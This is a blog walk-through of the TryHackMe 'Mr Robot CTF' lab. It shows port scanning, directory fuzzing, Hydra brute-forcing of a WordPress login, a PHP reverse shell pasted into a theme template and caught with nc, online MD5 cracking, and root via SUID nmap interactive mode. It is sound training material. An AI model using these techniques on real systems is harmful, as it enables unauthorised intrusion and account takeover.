---
title: "Walk-through of Mr Robot CTF from TryHackMe"
header:
  teaser: /assets/images/2020-05-26-21-37-18.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - gobuster
  - 
  - SSH
  - FTP
  - Linux
---

## Machine Information

![mrrobot](/assets/images/2020-05-26-21-37-18.png)

Mr Robot CTF is a beginner level room themed around the TV series [Mr Robot](https://en.wikipedia.org/wiki/Mr._Robot). Skills required are basic knowledge of Linux and enumerating ports and services. Skills learned are basic web-based enumeration and fuzzing, and the importance of examining source code.
<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Easy - Mr Robot CTF](https://tryhackme.com/room/mrrobot) |
| Machine Release Date | 27th November 2018 |
| Date I Completed It | 25th May 2020 |
| Distribution used | Kali 2020.1 – [Release Info](https://www.kali.org/releases/kali-linux-2020-1-release/) |

## Initial Recon

First start with a port scan:

```text
root@kali:~/thm/mrrobot# ports=$(nmap -p- --min-rate=1000 -T4 10.10.175.84 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
root@kali:~/thm/mrrobot# nmap -p$ports -v -sC -sV -oA mrrobot 10.10.175.84

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-25 14:05 BST
Initiating SYN Stealth Scan at 14:05
Scanning 10.10.175.84 [3 ports]
Discovered open port 443/tcp on 10.10.175.84
Discovered open port 80/tcp on 10.10.175.84
Completed SYN Stealth Scan at 14:05, 0.07s elapsed (3 total ports)
Initiating Service scan at 14:05
Scanning 2 services on 10.10.175.84
Completed Service scan at 14:05, 12.24s elapsed (2 services on 1 host)
Nmap scan report for 10.10.175.84
Host is up (0.026s latency).
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
|_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.17 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (156B)
```

Only a couple of open ports, have a look in browser at port 80:

![home-page](/assets/images/2020-05-26-21-41-40.png)

Has an interesting site to play with. Trying out the commands takes you to subpages, with content from the show. Not a lot going on, check source code:

![source-code](/assets/images/2020-05-26-21-42-15.png)

Source has USER_IP='208.185.115.6', some external IP, make a note for later. Time to have a look for hidden files and folders:

```text
root@kali:~/thm/mrrobot# gobuster -t 100 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.175.84
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.175.84
[+] Threads:        5
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        30s
===============================================================
2020/05/25 20:56:57 Starting gobuster
===============================================================
/0 (Status: 301)
/images (Status: 301)
/blog (Status: 301)
/sitemap (Status: 200)
/rss (Status: 301)
/login (Status: 302)
/video (Status: 301)
/feed (Status: 301)
/image (Status: 301)
/atom (Status: 301)
/wp-content (Status: 301)
/admin (Status: 301)
/audio (Status: 301)
/intro (Status: 200)
/wp-login (Status: 200)
/css (Status: 301)
/rss2 (Status: 301)
/license (Status: 200)
/wp-includes (Status: 301)
/js (Status: 301)
/Image (Status: 301)
/rdf (Status: 301)
/page1 (Status: 301)
/readme (Status: 200)
/robots (Status: 200)
/dashboard (Status: 302)
/%!(NOVERB) (Status: 301)
```

Lots of folders, also some that confirm it's a Wordpress site. Check them out:

![readme](/assets/images/2020-05-26-21-44-01.png)

![robot](/assets/images/2020-05-26-21-44-20.png)

Not a lot, but this one is interesting:

![robots.txt](/assets/images/2020-05-26-21-44-46.png)

## Grabbing Key 1

See if we can grab those files:

```text
root@kali:~# wget http://10.10.175.84/fsocity.dic
--2020-05-25 21:27:20--  http://10.10.175.84/fsocity.dic
Connecting to 10.10.175.84:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7245381 (6.9M) [text/x-c]
Saving to: ‘fsocity.dic’
fsocity.dic                                                100%[=======================================================================================================================================>]   6.91M  1.90MB/s    in 5.3s    
2020-05-25 21:27:25 (1.31 MB/s) - ‘fsocity.dic’ saved [7245381/7245381]

root@kali:~# wget http://10.10.175.84/key-1-of-3.txt
--2020-05-25 21:27:42--  http://10.10.175.84/key-1-of-3.txt
Connecting to 10.10.175.84:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 33 [text/plain]
Saving to: ‘key-1-of-3.txt’
key-1-of-3.txt                                             100%[=======================================================================================================================================>]      33  --.-KB/s    in 0s      
2020-05-25 21:27:42 (6.12 MB/s) - ‘key-1-of-3.txt’ saved [33/33]
```

Have a look at them:

```text
root@kali:~/thm/mrrobot# cat key-1-of-3.txt
<<HIDDEN>>
```

We have the first key, record it. Now looking at fsocity.dic, it seems to be a largish dictionary file. First see if we can reduce size if there are any repeated values:

```text
root@kali:~/thm/mrrobot# sort fsocity.dic | uniq > fsocity.uniq
root@kali:~/thm/mrrobot# wc fsocity.dic
 858161  858161 7245391 fsocity.dic
root@kali:~/thm/mrrobot# wc fsocity.uniq 
11451 11451 96747 fsocity.uniq
```

That's better, reduced file from 858k lines to 11k. Check contents:

```text
root@kali:~/thm/mrrobot# more fsocity.dic
true
false
wikia
from
the
now
Wikia
extensions
scss
window
http
var
page
Robot
Elliot
styles
and
document
mrrobot
<SNIP>
```

## Gaining Access

Save this file for later. Looking back at gobuster list of folders we have wp-login, lets try that:

![wp-login](/assets/images/2020-05-26-21-45-20.png)

The error message for an invalid username means we can brute force the login box to find it, assuming the dictionary file we just found contains it. Fire up Burp first to capture the login response:

![burp-user](/assets/images/2020-05-26-21-45-43.png)

Can use that log line with Hyrdra:

```text
root@kali:~/thm/mrrobot# hydra -L fsocity.dic -p pencer 10.10.175.84 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.175.84%2Fwp-admin%2F&testcookie=1:F=Invalid username"
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-25 21:51:51
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
[DATA] attacking http-post-form://10.10.175.84:80/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.175.84%2Fwp-admin%2F&testcookie=1:F=Invalid username
[80][http-post-form] host: 10.10.175.84   login: Elliot   password: pencer
```

After a few seconds we find Elliot is the login name. Now repeat using that to hopefully find the password:

![burp-password](/assets/images/2020-05-26-21-46-06.png)

Modify Hydra to use the dic file on the password now we have username:

```text
root@kali:~/thm/mrrobot# hydra -L Elliot -P fsociety.dic 10.10.23.78 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.23.78%2Fwp-admin%2F&testcookie=1:S=302"
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-25 22:13:44
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858236 login tries (l:1/p:858236), ~53640 tries per task
[DATA] attacking http-post-form://10.10.23.78:80/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.23.78%2Fwp-admin%2F&testcookie=1:S=302
[80][http-post-form] host: 10.10.23.78   login: Elliot   password: <<HIDDEN>>
```

We find the password from the file, now we can log in:

![wp-admin](/assets/images/2020-05-26-21-47-10.png)

A quick look around and we find we can edit a template. Let's get a reverse shell uploaded so we can connect. First grab a php one from Kali:

```text
root@kali:~/thm/mrrobot# ls /usr/share/webshells/php
findsocket  php-backdoor.php  php-reverse-shell.php  qsd-php-backdoor.php  simple-backdoor.php
```

The php-reverse-shell.php is pre-installed on Kali. It's just the same as the version on [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). Copy the contents and paste in to the 404 template, overwriting all that was in there before:

![edit-theme](/assets/images/2020-05-26-21-47-43.png)

Save the template, start NC listening on your attack machine, then visit the 404 page to get the shell to start.

Now we are connected, so first we upgrade to proper shell:

```text
listening on [any] 1234 ...
connect to [10.9.17.195] from (UNKNOWN) [10.10.23.78] 49546
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 21:30:24 up 32 min,  0 users,  load average: 0.00, 0.12, 0.58
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off

$ python -c 'import pty;pty.spawn("/bin/bash")'
daemon@linux:/$ ^Z
[1]+  Stopped                 nc -nlvp 1234
root@kali:~/thm/mrrobot# stty raw -echo
daemon@linux:/$ export TERM=screen
```

## Grabbing Key 2

Now look around and find this:

```text
daemon@linux:/$ ls -ls home/robot/
total 8
4 -r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
4 -rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5

Can't access key yet, but do have access to the password file:
daemon@linux:/$ cat home/robot/password.raw-md5
<<HIDDEN>>
```

Looks to be a password, give it a try:

```text
daemon@linux:/$ su robot
Password: 
su: Authentication failure
```

Nope, but it does say md5 in filename, so maybe it is encrypted, try and crack it using [this](https://md5.gromweb.com) site.

![md5-reverse](/assets/images/2020-05-26-21-48-17.png)

That looks better, give it a try:

```text
daemon@linux:/$ su robot
Password:
robot@linux:/$
```

Success, now we can get the second key:

```text
robot@linux:/$ cat /home/robot/key-2-of-3.txt
<<HIDDEN>
```

## Privilge Escalation

Now we need to escalate to root to get the last key. First thing to do is look for any files with SUID set. These can be used to run as root from our current user:

```text
robot@linux:/$ find / -perm -4000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
```

## Grabbing Key 3

We see nmap is in the list, there is a simple way to run that in interactive mode to get a root shell:

```text
robot@linux:/$ /usr/local/bin/nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
# id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
# cat /root/key-3-of-3.txt
<<HIDDEN>>
```

All done. See you next time.
